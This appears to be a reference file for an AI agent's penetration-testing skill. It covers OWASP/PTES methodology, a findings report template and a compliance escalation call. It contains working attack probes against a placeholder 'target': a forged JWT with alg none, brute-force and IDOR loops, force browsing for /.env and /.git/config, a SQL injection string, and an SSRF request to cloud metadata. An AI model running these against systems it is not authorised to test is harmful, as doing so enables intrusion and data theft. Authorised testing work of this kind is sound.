# Pen Tester Reference

Use this file for detailed attack patterns, payloads, and reporting templates after the router in `SKILL.md` decides the task belongs here.

## Methodology

- Default to **OWASP ASVS v5 Level 2** unless the task names a stricter level.
- Follow PTES-style flow: reconnaissance → threat modelling → exploitation → post-exploitation → reporting.
- Apply attacker mindset principles: trust nothing, think laterally, chain low-severity issues, and test rejection paths first.

## Example attack patterns

### JWT algorithm confusion

```bash
TOKEN=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"victim-user-id","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_')
ATTACK_TOKEN="${TOKEN}.${PAYLOAD}."
curl -H "Authorization: Bearer $ATTACK_TOKEN" https://target/api/admin
```

### Brute force / rate limit test

```bash
for i in {1..20}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target/api/auth/login \
    -H 'Content-Type: application/json' \
    -d '{"email":"victim@example.com","password":"wrong'$i'"}'
done
```

### Horizontal IDOR

```bash
for ID in order_abc120 order_abc121 order_abc122 order_abc124; do
  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $USER_A_TOKEN" \
    https://target/api/orders/$ID)
  echo "$ID: $HTTP_CODE"
done
```

### Vertical privilege escalation

```bash
ADMIN_ENDPOINTS=("/api/admin/users" "/api/admin/settings" "/api/admin/logs")
for ENDPOINT in "${ADMIN_ENDPOINTS[@]}"; do
  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
    https://target$ENDPOINT)
  echo "$ENDPOINT: $HTTP_CODE"
done
```

### Force browsing

```bash
PATHS=("/admin" "/admin/users" "/api/internal" "/debug" "/.env" "/backup" "/api/v1/admin" "/swagger" "/api-docs" "/graphql" "/.git/config")
for PATH in "${PATHS[@]}"; do
  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" https://target$PATH)
  echo "$PATH: $HTTP_CODE"
done
```

### SQL injection probe

```bash
curl "https://target/api/search?q=test%27%20OR%201=1--" -H "Authorization: Bearer $TOKEN"
```

### SSRF test

```bash
curl "https://target/api/preview?url=http://169.254.169.254/latest/meta-data/" -H "Authorization: Bearer $TOKEN"
```

## Reporting template

```markdown
### [SEVERITY] [CVE or CWE if applicable]: [Short Title]

**Endpoint/Component**: [exact URL or file path]
**Affected Users**: [All users / Admin users / Authenticated users / etc.]

**Description**:
[Plain English explanation]

**Proof of Concept**:
[Exact curl command or code to reproduce]

**Evidence**:
[HTTP response, screenshot, or output]

**Impact**:
[What an attacker can do]

**Remediation**:
[Specific code or configuration fix]
```

## Compliance escalation

When findings expose personal data, escalate to `wunderkind:compliance-officer`:

```typescript
task(
  category="unspecified-high",
  load_skills=["wunderkind:compliance-officer"],
  description="Compliance assessment for PII exposure finding",
  prompt="A pen test finding has identified potential exposure of personal data: [describe the finding, data types exposed, affected user scope]. Assess: 1) Does this constitute a notifiable data breach under the applicable regulation? 2) What is the notification timeline and to whom? 3) What documentation is required? 4) What is the data classification impact? Return a breach assessment with recommended immediate actions.",
  run_in_background=false
)
```
